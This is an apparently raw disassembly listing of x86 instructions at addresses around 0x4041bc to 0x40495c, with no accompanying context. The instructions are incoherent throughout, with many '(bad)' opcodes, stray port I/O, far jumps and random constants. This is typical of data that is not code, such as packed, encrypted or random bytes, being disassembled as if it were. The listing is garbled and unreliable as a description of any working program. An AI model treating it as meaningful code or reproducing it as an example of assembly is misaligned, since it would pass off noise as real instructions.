  4041bc:	out    0x1e,al
  4041be:	in     eax,0x9c
  4041c0:	add    esi,DWORD PTR [ebp-0x58]
  4041c3:	cdq    
  4041c4:	mov    esi,es
  4041c6:	sbb    BYTE PTR [ebp+eiz*4+0x65],bl
  4041ca:	add    al,0xbe
  4041cc:	push   0xd725994a
  4041d1:	cmp    ebx,DWORD PTR [ebx+0xc]
  4041d4:	nop
  4041d5:	sub    DWORD PTR [ecx+0x1e8d4d82],eax
  4041db:	sbb    al,BYTE PTR [eax]
  4041dd:	mov    edi,0x331a1a12
  4041e2:	adc    eax,0xeb5c1169
  4041e7:	push   cs
  4041e8:	std    
  4041e9:	push   0xd122d0e8
  4041ee:	fsubr  QWORD PTR [esp+ebp*1+0x6b]
  4041f2:	jl     0x404238
  4041f4:	inc    edx
  4041f5:	shl    BYTE PTR [ebp+ecx*1-0x78],cl
  4041f9:	push   cs
  4041fa:	rcr    edi,1
  4041fc:	mov    bl,0x8f
  4041fe:	int    0xaf
  404200:	and    cl,al
  404202:	push   cs
  404203:	(bad)  
  404205:	mov    esp,0x79dada3f
  40420a:	loope  0x40427b
  40420c:	inc    edi
  40420d:	frstor [ebx]
  40420f:	push   eax
  404210:	bound  esp,QWORD PTR [esi-0x37]
  404213:	ins    DWORD PTR es:[edi],dx
  404214:	xchg   esp,eax
  404215:	leave  
  404216:	and    BYTE PTR [edi-0x7c],dl
  404219:	mov    al,ds:0xd2e3d543
  40421e:	dec    esp
  40421f:	sar    BYTE PTR [ecx+0x4c],cl
  404222:	bnd jle 0x40427d
  404225:	test   DWORD PTR [ebx-0x492eebad],eax
  40422b:	mov    cl,0xc7
  40422d:	aaa    
  40422e:	xor    edi,DWORD PTR [ebx-0x64604b6f]
  404234:	mov    ds:0x7a067571,eax
  40423a:	dec    esp
  40423b:	out    0xcd,eax
  40423d:	xchg   ecx,eax
  40423e:	xlat   BYTE PTR ds:[ebx]
  40423f:	xchg   esp,eax
  404240:	fchs   
  404242:	bound  ebp,QWORD PTR [edx]
  404244:	push   ecx
  404245:	in     eax,dx
  404246:	jne    0x40420f
  404248:	cmp    DWORD PTR [ecx+0x1b],ecx
  40424b:	mov    eax,ds:0x467ed4e0
  404250:	add    ebx,esi
  404252:	inc    edi
  404253:	xor    eax,0x22db6c09
  404258:	mov    al,BYTE PTR [ecx-0x83a4d19]
  40425e:	out    dx,eax
  40425f:	mov    ebx,0xd22758cf
  404264:	jno    0x4041ef
  404266:	repz pop ss
  404268:	(bad)  
  404269:	cdq    
  40426a:	pop    esi
  40426b:	(bad)  
  40426c:	and    al,0x33
  40426e:	inc    edi
  40426f:	out    dx,al
  404270:	jg     0x40424f
  404272:	or     ecx,DWORD PTR [edi+0x43875486]
  404278:	(bad)  
  404279:	std    
  40427a:	dec    esi
  40427b:	iret   
  40427c:	aaa    
  40427d:	(bad)  
  40427e:	push   esi
  40427f:	push   es
  404280:	mov    bl,BYTE PTR [eax+0x1e5b646]
  404286:	pusha  
  404287:	add    eax,0xeb2f6de
  40428c:	cmc    
  40428d:	or     al,0x41
  40428f:	outs   dx,DWORD PTR ds:[esi]
  404290:	pop    edi
  404291:	mov    ?,WORD PTR [ecx-0x78338fc2]
  404297:	and    eax,0x98a70b2f
  40429c:	dec    ebp
  40429d:	bound  esi,QWORD PTR [ebp+0x60]
  4042a0:	inc    eax
  4042a1:	mov    esi,0x5c7cb799
  4042a6:	(bad)  
  4042a7:	jb     0x40422b
  4042a9:	pop    ds
  4042aa:	inc    eax
  4042ab:	jno    0x404287
  4042ad:	(bad)  
  4042ae:	aaa    
  4042af:	add    al,0x76
  4042b1:	repnz xor BYTE PTR [ebx+0x79],ah
  4042b5:	inc    ecx
  4042b6:	dec    ebp
  4042b7:	das    
  4042b8:	mov    ebp,0x12b37492
  4042bd:	xor    esi,0x2f
  4042c0:	imul   edx,esp,0x3733c517
  4042c6:	test   eax,0x79ac085b
  4042cb:	out    0x51,eax
  4042cd:	ror    BYTE PTR [ebx],1
  4042cf:	fistp  DWORD PTR [esi+0x52]
  4042d2:	cmc    
  4042d3:	dec    esp
  4042d4:	adc    ecx,DWORD PTR [edx+0x7bfc0421]
  4042da:	add    ax,0x26ef
  4042de:	cdq    
  4042df:	pop    ds
  4042e0:	pushf  
  4042e1:	arpl   WORD PTR [ebp+0x4],ax
  4042e4:	sub    al,0xf
  4042e6:	push   ebx
  4042e7:	cmp    esp,ebx
  4042e9:	jmp    0xc169:0xfeef73da
  4042f0:	adc    al,0x1
  4042f2:	push   eax
  4042f3:	fstp   TBYTE PTR [edi]
  4042f5:	aaa    
  4042f6:	or     DWORD PTR [edi-0x74],eax
  4042f9:	mov    cl,0x57
  4042fb:	jno    0x40428c
  4042fd:	sbb    eax,0x31e3b9ac
  404302:	(bad)  
  404303:	xchg   ecx,eax
  404304:	stc    
  404305:	rcl    BYTE PTR [ebx-0x6e],0xff
  404309:	imul   DWORD PTR [edi]
  40430b:	lahf   
  40430c:	or     al,0x36
  40430e:	jae    0x404320
  404310:	pop    ss
  404311:	adc    al,0x5a
  404313:	jle    0x404341
  404315:	jae    0x404305
  404317:	stos   BYTE PTR es:[edi],al
  404318:	enter  0xd631,0xe1
  40431c:	xchg   edi,edx
  40431e:	add    bh,BYTE PTR [ecx]
  404320:	fsubr  st,st(5)
  404322:	push   eax
  404323:	repz out dx,eax
  404325:	bnd jge 0x4042c2
  404328:	cmp    eax,0xae2f7d0f
  40432d:	repz jae 0x40437b
  404330:	xor    BYTE PTR [eax+ecx*4+0x791e20d0],0x93
  404338:	ret    0x4c9d
  40433b:	clc    
  40433c:	pop    ecx
  40433d:	or     eax,0xb745f5de
  404342:	sbb    BYTE PTR [edx-0x51a4cbb8],al
  404348:	sbb    eax,0xe68cabb
  40434d:	dec    ebx
  40434e:	pop    esp
  40434f:	test   eax,0x28559cbb
  404354:	adc    DWORD PTR [eax+0x2e0764bc],0xffffffea
  40435b:	outs   dx,BYTE PTR ds:[esi]
  40435c:	jns    0x4042ff
  40435e:	(bad)  
  404360:	ror    BYTE PTR [ebp+edi*4+0x28],cl
  404364:	cwde   
  404365:	iret   
  404366:	loopne 0x4043c7
  404368:	or     ebx,DWORD PTR [ebx+0x578f6856]
  40436e:	push   edx
  40436f:	sub    DWORD PTR ss:[ecx-0x246b9ce6],eax
  404376:	xchg   edi,eax
  404377:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404378:	sbb    al,0xbb
  40437a:	xchg   DWORD PTR [ecx],esi
  40437c:	mov    ecx,0x5ffb32f3
  404381:	mov    ds:0x4c60f43d,al
  404386:	pop    ecx
  404387:	lea    ebx,[edi]
  404389:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40438a:	(bad)  
  40438b:	fbld   TBYTE PTR [ebx+0x302c4e27]
  404391:	mov    cl,BYTE PTR [eax-0x13969d2e]
  404397:	ffree  st(6)
  404399:	out    dx,al
  40439a:	shld   DWORD PTR [ebp-0x6aebbcb4],ecx,0x8f
  4043a2:	fcmovne st,st(4)
  4043a4:	mul    DWORD PTR [ebx]
  4043a6:	push   0xfffffff2
  4043a8:	sub    eax,0x74260f17
  4043ad:	dec    esp
  4043ae:	xor    dh,BYTE PTR [eax+0x6a]
  4043b1:	(bad)  
  4043b3:	stos   BYTE PTR es:[edi],al
  4043b4:	mov    ds:0xa9834e52,al
  4043b9:	xchg   edi,eax
  4043ba:	jae    0x40438b
  4043bc:	rcl    DWORD PTR [edi-0x9],1
  4043bf:	inc    edi
  4043c0:	push   ds
  4043c1:	and    dh,BYTE PTR [edx+0x770eff47]
  4043c7:	push   edi
  4043c8:	mov    ch,0x38
  4043ca:	loopne 0x40439a
  4043cc:	lahf   
  4043cd:	jo     0x40435a
  4043cf:	ja     0x404363
  4043d1:	mov    ebp,DWORD PTR [edx-0x640d871d]
  4043d7:	std    
  4043d8:	shl    BYTE PTR [edi-0x3],0x5c
  4043dc:	dec    eax
  4043dd:	popf   
  4043de:	int    0x37
  4043e0:	xchg   esp,eax
  4043e1:	sbb    DWORD PTR [eax],esi
  4043e3:	ss in  al,dx
  4043e5:	stos   BYTE PTR es:[edi],al
  4043e6:	scas   al,BYTE PTR es:[edi]
  4043e7:	xor    BYTE PTR [ebp+0x51],dl
  4043ea:	sub    ecx,DWORD PTR [ebx]
  4043ec:	nop
  4043ed:	fcom   DWORD PTR [eax]
  4043ef:	or     ch,BYTE PTR [ecx]
  4043f1:	das    
  4043f2:	push   ds
  4043f3:	rcr    DWORD PTR [edx+edi*4+0x7a],0xa6
  4043f8:	pop    ebx
  4043f9:	dec    ebp
  4043fa:	mov    al,ds:0x78d17d20
  4043ff:	add    al,0x76
  404401:	and    BYTE PTR [ecx+0x1c9567fb],0xce
  404408:	xchg   esi,eax
  404409:	scas   eax,DWORD PTR es:[edi]
  40440a:	icebp  
  40440b:	gs mov ebx,0xeb8c9aef
  404411:	in     eax,0x33
  404413:	fwait
  404414:	mov    edx,DWORD PTR [ecx-0x5888e8c0]
  40441a:	xor    BYTE PTR [edx-0x3a535e44],dl
  404420:	cmp    al,0x19
  404422:	adc    DWORD PTR [eax+0x79],esp
  404425:	out    dx,al
  404426:	call   0x1df1:0x94f14c7
  40442d:	into   
  40442e:	mov    ebp,0x86384929
  404433:	adc    BYTE PTR ds:0x1b52aea9,dl
  404439:	mov    edx,0xbddd02e4
  40443e:	sahf   
  40443f:	xchg   esp,eax
  404440:	icebp  
  404441:	shr    DWORD PTR [edi+0x15],cl
  404444:	cmp    al,0x15
  404446:	xor    ch,ah
  404448:	xchg   DWORD PTR [esi+0x1e],ecx
  40444b:	int3   
  40444c:	shr    DWORD PTR [edi],cl
  40444e:	jne    0x404496
  404450:	mov    ds:0xb23f9ca3,al
  404455:	dec    eax
  404456:	test   al,0xb2
  404458:	xchg   edi,eax
  404459:	push   esp
  40445a:	push   esi
  40445b:	icebp  
  40445c:	fld    QWORD PTR ds:[edi]
  40445f:	push   es
  404460:	in     eax,0x89
  404462:	mov    ebx,?
  404464:	jns    0x4043e7
  404466:	mov    BYTE PTR [eax-0x20],dh
  404469:	frstor [eax-0x7f084c13]
  40446f:	(bad)  
  404470:	mov    eax,ds:0xde9d874f
  404475:	shl    DWORD PTR [edi+0x79928658],cl
  40447b:	mov    dh,cl
  40447d:	xlat   BYTE PTR ds:[ebx]
  40447e:	fsub   DWORD PTR fs:[ebx-0x68]
  404482:	aam    0x98
  404484:	jne    0x4044f8
  404486:	sub    BYTE PTR [ecx],0x38
  404489:	popf   
  40448a:	pusha  
  40448b:	inc    esi
  40448c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40448d:	add    ch,BYTE PTR [eax]
  40448f:	sbb    eax,DWORD PTR [eax]
  404491:	push   edi
  404492:	or     dl,ah
  404494:	into   
  404495:	and    DWORD PTR [ecx],edi
  404497:	iret   
  404498:	sub    eax,esi
  40449a:	es mov cl,0x58
  40449d:	popf   
  40449e:	pcmpeqw mm6,QWORD PTR [ebp-0x26]
  4044a2:	sub    al,0xd3
  4044a4:	sbb    BYTE PTR [edx+0x65],dh
  4044a7:	ds gs mov bl,0x80
  4044ab:	cld    
  4044ac:	test   DWORD PTR [ebx],ebx
  4044ae:	fstp   DWORD PTR [edi-0x20f8b201]
  4044b4:	xchg   BYTE PTR [eax+edi*1+0x1d],dl
  4044b8:	sub    WORD PTR [edi],0x6a2f
  4044bd:	out    dx,al
  4044be:	or     cl,dl
  4044c0:	lock (bad) 
  4044c2:	cmp    eax,0x332c735d
  4044c7:	(bad)  
  4044c8:	and    dl,BYTE PTR [eax]
  4044ca:	ins    BYTE PTR es:[edi],dx
  4044cb:	loop   0x4044b9
  4044cd:	std    
  4044ce:	dec    ebp
  4044cf:	out    0x4b,al
  4044d1:	fsubr  DWORD PTR [edx]
  4044d3:	std    
  4044d4:	sbb    dh,0xb1
  4044d7:	xchg   BYTE PTR [eax+0x2e9d03ba],cl
  4044dd:	xchg   ebp,eax
  4044de:	sbb    DWORD PTR [edi],ebp
  4044e0:	mov    al,0x8a
  4044e2:	xor    DWORD PTR [eax],0x5d
  4044e5:	mov    ebx,0x26fb9755
  4044ea:	inc    ebp
  4044eb:	call   0x3d316f5f
  4044f0:	xchg   esp,eax
  4044f1:	mov    ebx,0xd8b7537f
  4044f6:	mov    al,0x99
  4044f8:	outs   dx,BYTE PTR ds:[esi]
  4044f9:	jb     0x4044c0
  4044fb:	mov    bh,0x52
  4044fd:	(bad)
  404501:	std    
  404502:	add    ch,BYTE PTR [eax]
  404504:	xor    DWORD PTR [esi-0x502d077c],edx
  40450a:	out    dx,al
  40450b:	xor    al,0x8b
  40450d:	ret    0x6733
  404510:	add    eax,edi
  404512:	push   esp
  404513:	and    bh,BYTE PTR [edi-0x19]
  404516:	enter  0x8dda,0x39
  40451a:	icebp  
  40451b:	mov    bh,0x5
  40451d:	popa   
  40451e:	cmp    BYTE PTR [ecx-0x36],cl
  404521:	loopne 0x404582
  404523:	pop    esp
  404524:	mov    bh,dl
  404526:	mov    eax,0x9564e86d
  40452b:	fsub   DWORD PTR [ebp+0x26aa7169]
  404531:	pop    ds
  404532:	mov    eax,ds:0x26a7ee5d
  404537:	adc    al,0x29
  404539:	inc    esp
  40453a:	loopne 0x4045b8
  40453c:	jns    0x40451d
  40453e:	xor    ebx,DWORD PTR [edx]
  404540:	fs sub eax,0xf649b1de
  404546:	sub    BYTE PTR [ebp+0x26b28a44],0x49
  40454d:	and    BYTE PTR [esi+0x67],bh
  404550:	popf   
  404551:	and    esp,esp
  404553:	or     BYTE PTR [esi+0x7],dh
  404556:	add    BYTE PTR [esi+esi*2-0x15],bl
  40455a:	vpunpcklwd ymm2,ymm5,YMMWORD PTR [edx+eiz*2]
  40455f:	ja     0x404542
  404561:	mov    edx,0x1d81f7ca
  404566:	je     0x404541
  404568:	xor    bh,BYTE PTR [eax-0x5357212a]
  40456e:	test   BYTE PTR [ebx-0x7a],cl
  404571:	mov    DWORD PTR [ecx-0x52],0xc3e993bf
  404578:	xchg   edi,eax
  404579:	jae    0x404588
  40457b:	in     al,dx
  40457c:	add    DWORD PTR [esi+0x1ec37258],edx
  404582:	ficom  WORD PTR [ebp+0x8]
  404585:	or     BYTE PTR [eax-0x69],bh
  404588:	cmp    eax,0x75a5a57b
  40458d:	pop    ecx
  40458e:	dec    edx
  40458f:	sbb    ah,BYTE PTR [esi]
  404591:	mov    eax,ds:0x39ae2d7f
  404596:	pop    edx
  404597:	sahf   
  404598:	(bad)  
  404599:	iret   
  40459a:	jl     0x4045a5
  40459c:	cmp    DWORD PTR [ebp-0x25aa65b5],ebp
  4045a2:	xchg   edi,eax
  4045a3:	ins    BYTE PTR es:[edi],dx
  4045a4:	data16 cmc 
  4045a6:	cmp    esp,edx
  4045a8:	mov    bh,0x11
  4045aa:	add    cl,0x4b
  4045ad:	pop    es
  4045ae:	xor    ecx,DWORD PTR [ecx]
  4045b0:	aad    0xa4
  4045b2:	(bad)  
  4045b3:	popa   
  4045b4:	and    eax,0x6ba43277
  4045b9:	fst    DWORD PTR [edi]
  4045bb:	(bad)  
  4045bc:	adc    edx,edi
  4045be:	ret    
  4045bf:	fild   WORD PTR [edx+0x1620a8ef]
  4045c5:	sbb    DWORD PTR [edx],ebp
  4045c7:	mov    ebp,DWORD PTR ss:[edi+ecx*2-0x19642dd9]
  4045cf:	fisubr WORD PTR [ecx+ebx*1-0x38010042]
  4045d6:	dec    ebx
  4045d7:	dec    ebx
  4045d8:	pushf  
  4045d9:	das    
  4045da:	rcr    DWORD PTR ds:0xafa08deb,0xc
  4045e1:	xor    BYTE PTR [ecx],dl
  4045e3:	and    eax,0x2f33cc2b
  4045e8:	sbb    DWORD PTR [eax+0x78c2c8c9],edx
  4045ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045ef:	scas   eax,DWORD PTR es:[edi]
  4045f0:	jmp    0x25db2e6c
  4045f5:	(bad)  
  4045f6:	fidiv  DWORD PTR [eax-0x3ac63a8c]
  4045fc:	fist   WORD PTR [edi]
  4045fe:	dec    esi
  4045ff:	cmp    cl,al
  404601:	stos   DWORD PTR es:[edi],eax
  404602:	xor    eax,0x4edf5ce8
  404607:	sub    esp,DWORD PTR [edi-0x26123895]
  40460d:	test   DWORD PTR [ebx],ebp
  40460f:	mov    ch,dh
  404611:	bound  edx,QWORD PTR [esi+0x732695e7]
  404617:	sbb    eax,0x9ad3269d
  40461c:	repz pop ds
  40461e:	fld    TBYTE PTR [edx]
  404620:	xor    eax,0xe44b2721
  404625:	scas   al,BYTE PTR es:[edi]
  404626:	retf   
  404627:	in     eax,0x5d
  404629:	sub    eax,0xd4ba2936
  40462e:	lock mov al,BYTE PTR [ebx]
  404631:	popf   
  404632:	and    al,0x82
  404634:	or     dl,BYTE PTR [ebx+0x1bfb7255]
  40463a:	mov    al,0xdc
  40463c:	inc    edi
  40463d:	sahf   
  40463e:	stos   DWORD PTR es:[edi],eax
  40463f:	cmp    dh,BYTE PTR [esi+0x19]
  404642:	popf   
  404643:	inc    ebx
  404644:	cmp    ebx,DWORD PTR [ebx-0x10d90d5e]
  40464a:	push   es
  40464b:	test   ch,ch
  40464d:	gs mov cl,0xaf
  404650:	and    eax,0xd3678783
  404655:	xor    al,0xe8
  404657:	into   
  404658:	pop    ds
  404659:	aaa    
  40465a:	scas   eax,DWORD PTR es:[edi]
  40465b:	dec    ecx
  40465c:	pop    ebx
  40465d:	xlat   BYTE PTR ds:[ebx]
  40465e:	and    ah,BYTE PTR [edi+ebx*8+0x3f7be7d7]
  404665:	and    DWORD PTR cs:[ecx+0x4e],0xffffffdf
  40466a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40466b:	cmp    eax,0x716dd316
  404670:	test   eax,0x15cc23d1
  404675:	mov    ecx,0x1a5e6163
  40467a:	adc    DWORD PTR [esi],ecx
  40467c:	mov    edi,0x3698eb86
  404681:	and    edi,edi
  404683:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404684:	xchg   ebx,eax
  404685:	push   esp
  404686:	call   0xc541:0x24a8a214
  40468d:	cwde   
  40468e:	retf   
  40468f:	pop    eax
  404690:	or     DWORD PTR [edx],eax
  404692:	bound  ebp,QWORD PTR [edx+0x1b9ded94]
  404698:	push   esi
  404699:	mov    bl,0x67
  40469b:	mov    ebp,ds
  40469d:	in     al,0x21
  40469f:	dec    edi
  4046a0:	lock inc ebx
  4046a2:	pusha  
  4046a3:	scas   eax,DWORD PTR es:[edi]
  4046a4:	sahf   
  4046a5:	stos   DWORD PTR es:[edi],eax
  4046a6:	push   cs
  4046a7:	mov    edx,0xb5ecdcef
  4046ac:	jg     0x4046a2
  4046ae:	ret    
  4046af:	and    esi,DWORD PTR [ebx+eiz*2+0x16]
  4046b3:	push   edi
  4046b4:	push   ds
  4046b5:	lahf   
  4046b6:	(bad)  
  4046b7:	data16 and cl,ah
  4046ba:	xchg   edx,eax
  4046bb:	int    0xe4
  4046bd:	jg     0x4046b4
  4046bf:	sbb    eax,0x255a7f9a
  4046c4:	mov    edx,ecx
  4046c6:	xor    eax,0xac5e1390
  4046cb:	mov    BYTE PTR [esi+ecx*1-0xe],al
  4046cf:	add    al,BYTE PTR [eax+0x781c77a6]
  4046d5:	xor    esp,ecx
  4046d7:	shl    ecx,cl
  4046d9:	dec    edi
  4046da:	add    al,0x5a
  4046dc:	jmp    0x516a:0x1356aca8
  4046e3:	cli    
  4046e4:	inc    esi
  4046e5:	idiv   DWORD PTR [edx+0x5ddbeb15]
  4046eb:	mov    cl,0x9d
  4046ed:	pop    esi
  4046ee:	mov    ebx,0x27573ccf
  4046f3:	inc    esi
  4046f4:	rcr    cl,1
  4046f6:	fidivr DWORD PTR [eax]
  4046f8:	outs   dx,DWORD PTR ds:[esi]
  4046f9:	jge    0x4046f0
  4046fb:	mov    edx,esi
  4046fd:	pinsrw mm0,WORD PTR [ecx+0x2781596e],0x61
  404705:	push   ss
  404706:	les    ebp,FWORD PTR [edx+0x3af2d491]
  40470c:	shl    DWORD PTR [ecx+0x27],0x71
  404710:	or     bl,ah
  404712:	je     0x4046c3
  404714:	popa   
  404715:	push   0x4c
  404717:	leave  
  404718:	or     dl,BYTE PTR [ebx-0x7b9c72a7]
  40471e:	comiss xmm6,DWORD PTR [ecx-0x62]
  404722:	out    dx,eax
  404723:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404724:	lock xor dl,BYTE PTR [ecx+ebp*1]
  404728:	and    bl,BYTE PTR [ebx+0x5b7c6e23]
  40472e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40472f:	stos   BYTE PTR es:[edi],al
  404730:	ds xchg esp,eax
  404732:	or     al,0x5e
  404734:	ins    BYTE PTR es:[edi],dx
  404735:	sbb    DWORD PTR [esi],esi
  404737:	or     edi,DWORD PTR [edi]
  404739:	adc    al,0x5e
  40473b:	xchg   edi,eax
  40473c:	rcl    BYTE PTR ds:0xdbf0bac6,0x10
  404743:	ss aad 0x2a
  404746:	jmp    DWORD PTR [edi+0x3ee945b2]
  40474c:	sub    eax,0xfffffff5
  40474f:	lahf   
  404750:	adc    eax,0xb6cd44fc
  404755:	rcr    BYTE PTR [esi-0x72],cl
  404758:	jg     0x4047c9
  40475a:	or     al,0xba
  40475c:	adc    al,0x67
  40475e:	inc    ebp
  40475f:	ins    DWORD PTR es:[edi],dx
  404760:	cmp    al,0xb2
  404762:	push   ds
  404763:	dec    edx
  404764:	ss scas al,BYTE PTR es:[edi]
  404766:	iret   
  404767:	pop    ss
  404768:	in     eax,dx
  404769:	shr    esi,0xb1
  40476c:	out    dx,eax
  40476d:	pop    edi
  40476e:	mov    ebx,0x53f9b22b
  404773:	inc    ebx
  404774:	pop    esi
  404775:	push   eax
  404776:	ret    
  404777:	adc    BYTE PTR [ecx+0x4a],dl
  40477a:	push   edx
  40477b:	add    ecx,DWORD PTR [ebx-0x6e35772b]
  404781:	dec    esp
  404782:	add    ch,BYTE PTR ds:0xebb18034
  404788:	adc    DWORD PTR [edi+eax*2+0x27],edi
  40478c:	pop    esp
  40478d:	inc    edi
  40478e:	cwde   
  40478f:	scas   eax,DWORD PTR es:[edi]
  404790:	add    ah,BYTE PTR [edx-0x27]
  404793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404794:	(bad)  
  404795:	or     ebx,ecx
  404797:	dec    esi
  404798:	ss mov dh,0xc4
  40479b:	in     al,dx
  40479c:	mov    al,0x2c
  40479e:	adc    ch,BYTE PTR [ecx-0x29b04cc4]
  4047a4:	pop    eax
  4047a5:	or     edx,esp
  4047a7:	inc    esi
  4047a8:	sub    BYTE PTR [ecx+0x915d34],0x87
  4047af:	mov    ebp,gs
  4047b1:	dec    esp
  4047b2:	in     eax,dx
  4047b3:	scas   al,BYTE PTR es:[edi]
  4047b4:	shl    BYTE PTR [edi-0x64],0xd1
  4047b8:	xchg   ebp,eax
  4047b9:	es sti 
  4047bb:	cs push ss
  4047bd:	fisttp QWORD PTR [ecx]
  4047bf:	or     BYTE PTR [ebp+0xf],bh
  4047c2:	gs inc esp
  4047c4:	stos   DWORD PTR es:[edi],eax
  4047c5:	jle    0x404755
  4047c7:	jne    0x40478e
  4047c9:	out    0xfb,al
  4047cb:	add    ecx,edx
  4047cd:	ins    BYTE PTR es:[edi],dx
  4047ce:	or     al,0x2d
  4047d0:	mov    WORD PTR [esp+eax*8],cs
  4047d3:	xchg   esi,eax
  4047d4:	leave  
  4047d5:	sub    al,0xed
  4047d7:	push   ebp
  4047d8:	jle    0x4047bc
  4047da:	mov    ds:0xbb36fb74,al
  4047df:	out    dx,eax
  4047e0:	sub    BYTE PTR [ecx-0x77],dh
  4047e3:	clc    
  4047e4:	xchg   cl,dh
  4047e6:	mov    bh,0xec
  4047e8:	repz inc ebp
  4047ea:	xchg   esp,eax
  4047eb:	cmp    DWORD PTR [ecx-0x3590260c],esi
  4047f1:	adc    al,ah
  4047f3:	in     al,dx
  4047f4:	push   ecx
  4047f5:	jmp    0x3370f745
  4047fa:	fcomp  DWORD PTR [esi+0x56]
  4047fd:	shl    dl,cl
  4047ff:	(bad)  
  404800:	popa   
  404801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404802:	inc    esi
  404803:	push   ds
  404804:	arpl   WORD PTR [edi+ebx*2],cx
  404807:	jnp    0x4047f5
  404809:	fcomi  st,st(3)
  40480b:	mul    BYTE PTR [ebx]
  40480d:	xchg   esi,eax
  40480e:	or     BYTE PTR [edx],al
  404810:	dec    ebp
  404811:	ds or  al,0x74
  404814:	mov    al,ds:0x36be311a
  404819:	xchg   DWORD PTR [ebx-0x2f],ebp
  40481c:	or     cl,BYTE PTR [edi-0x68ebddf6]
  404822:	adc    al,0x22
  404824:	push   eax
  404825:	sub    cl,BYTE PTR [esi]
  404827:	or     DWORD PTR [edi+0x1c],edx
  40482a:	(bad)  
  40482b:	and    BYTE PTR [ecx],bl
  40482d:	mov    ecx,0x7f20e408
  404832:	push   ecx
  404833:	packssdw mm7,QWORD PTR [edi]
  404836:	mov    bl,0x15
  404838:	sub    BYTE PTR [ecx],dl
  40483a:	or     al,0x6e
  40483c:	sub    esi,DWORD PTR [edi]
  40483e:	sub    BYTE PTR [ecx-0x3bbbfdf4],0xc8
  404845:	sbb    dl,BYTE PTR [edx]
  404847:	xchg   ebp,eax
  404848:	in     eax,dx
  404849:	loopne 0x40485b
  40484b:	add    DWORD PTR [ecx],edx
  40484d:	push   ss
  40484e:	addr16 inc edx
  404850:	lock xchg BYTE PTR [edi+0x73],dh
  404854:	hlt    
  404855:	inc    DWORD PTR [edx+0x13]
  404858:	or     BYTE PTR [esi-0x26977a43],0x85
  40485f:	aad    0xf4
  404861:	pushf  
  404862:	mov    ds:0x8a4536fb,al
  404867:	xor    al,0x54
  404869:	add    DWORD PTR [ecx-0x80],ecx
  40486c:	add    bh,BYTE PTR [ebx-0x10bbb7eb]
  404872:	dec    ebp
  404873:	adc    ah,BYTE PTR ds:0x25d00456
  404879:	adc    al,0xa9
  40487b:	fstp   st(1)
  40487d:	lods   al,BYTE PTR ds:[esi]
  40487e:	scas   al,BYTE PTR es:[edi]
  40487f:	pop    esp
  404880:	adc    BYTE PTR [edi-0x39],ch
  404883:	sub    eax,eax
  404885:	cli    
  404886:	sti    
  404887:	xchg   esi,eax
  404888:	(bad)  
  404889:	cs push edi
  40488b:	cmp    eax,DWORD PTR [ebx+0x56]
  40488e:	repz iret 
  404890:	push   esi
  404891:	imul   edx,DWORD PTR [ebx],0x69
  404894:	sbb    esp,esp
  404896:	ror    BYTE PTR [edx],0x2d
  404899:	mov    dl,0xd0
  40489b:	stc    
  40489c:	imul   BYTE PTR [ecx]
  40489e:	cld    
  40489f:	jbe    0x40485a
  4048a1:	mov    edx,0x7d930ccc
  4048a6:	and    esi,edi
  4048a8:	lahf   
  4048a9:	sti    
  4048aa:	dec    ebx
  4048ab:	mov    bh,0x14
  4048ad:	inc    esp
  4048ae:	(bad)  
  4048af:	inc    esp
  4048b0:	pop    eax
  4048b1:	fisubr WORD PTR [eax+0x5bcf595e]
  4048b7:	inc    ebp
  4048b8:	mov    dl,BYTE PTR [ebx]
  4048ba:	popf   
  4048bb:	(bad)  
  4048bc:	loope  0x404850
  4048be:	ret    0x7a65
  4048c1:	(bad)  
  4048c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048c4:	int    0x23
  4048c6:	(bad)  
  4048c7:	in     eax,0x9a
  4048c9:	add    eax,0x968cf8d0
  4048ce:	std    
  4048cf:	stos   BYTE PTR es:[edi],al
  4048d0:	fwait
  4048d1:	imul   DWORD PTR [ebp-0x3f18b7c1]
  4048d7:	lock sub BYTE PTR ds:[esi-0x7d041741],ch
  4048df:	and    BYTE PTR [ebp+0x28],0xd7
  4048e3:	pop    eax
  4048e4:	push   edi
  4048e5:	cmp    ebx,eax
  4048e7:	mov    dh,BYTE PTR [edx-0x80]
  4048ea:	pop    ds
  4048eb:	xor    ebx,DWORD PTR [ecx+0x36]
  4048ee:	add    BYTE PTR [ebp+0x64a8e4e6],bl
  4048f4:	loop   0x404886
  4048f6:	dec    ebx
  4048f7:	inc    esp
  4048f8:	inc    esi
  4048f9:	jp     0x4048d9
  4048fb:	(bad)  
  4048fc:	xor    BYTE PTR [edi-0x71],0x6f
  404900:	scas   al,BYTE PTR es:[edi]
  404901:	into   
  404902:	data16 fadd QWORD PTR [ecx]
  404905:	jg     0x40493e
  404907:	in     al,dx
  404908:	pop    eax
  404909:	cmp    bl,cl
  40490b:	test   DWORD PTR [edi],0x98d82ca3
  404911:	hlt    
  404912:	lea    edi,ds:0x459f83a9
  404918:	aad    0xf
  40491a:	push   ecx
  40491b:	cmc    
  40491c:	bound  ecx,QWORD PTR [ebx-0x1ac68d6e]
  404922:	pop    eax
  404923:	push   edx
  404924:	aad    0x2f
  404926:	fsubr  DWORD PTR [esi+0x4e]
  404929:	and    eax,0x82551b04
  40492e:	sub    ch,dh
  404930:	pop    esp
  404931:	inc    esp
  404932:	xchg   ecx,eax
  404933:	mov    al,ds:0x5152b5b2
  404938:	cmp    dh,BYTE PTR [esi]
  40493a:	imul   edi,esi,0x33
  40493d:	adc    al,0xec
  40493f:	or     bl,BYTE PTR [ebp-0x224c3f68]
  404945:	das    
  404946:	cmp    edi,ebx
  404948:	and    al,0x8b
  40494a:	mov    WORD PTR [edi],gs
  40494c:	cmp    bl,BYTE PTR ss:[esp+edx*8-0x73]
  404951:	cwde   
  404952:	ins    DWORD PTR es:[edi],dx
  404953:	fcomp  st(0)
  404955:	sar    DWORD PTR [ebx+0x14c34b62],0x3c
  40495c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
